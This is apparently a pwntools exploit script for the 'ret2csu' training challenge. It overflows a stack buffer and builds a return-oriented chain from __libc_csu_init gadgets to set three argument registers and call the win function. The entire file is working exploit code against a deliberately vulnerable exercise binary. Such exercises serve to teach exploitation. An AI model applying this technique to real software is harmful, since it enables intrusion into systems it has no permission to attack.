from pwn import *

exe = './ret2csu'

def start(argv=[], *a, **kw):
    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe] + argv, *a, **kw)

gdbscript = '''
b * pwnme+152
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================

p = start()
context.log_level = 'DEBUG'
# ropchain definition
rdi    = p64(0xdeadbeefdeadbeef)
rsi    = p64(0xcafebabecafebabe)
rdx    = p64(0xd00df00dd00df00d)
poprdi = p64(0x4006a3)
init1  = p64(0x40069a)
init2  = p64(0x400680)
retw   = p64(0x400510)
ret    = p64(0x4004e6)
fini   = p64(0x600e48)

pe = 40*b"a" + init1 + p64(0x0) + p64(0x1) + fini + p64(0xdeadbeefdeadbeef) + rsi + rdx + init2 + 7*p64(0x0) + poprdi + p64(0xdeadbeefdeadbeef) + retw
p.sendline(pe)

p.interactive()

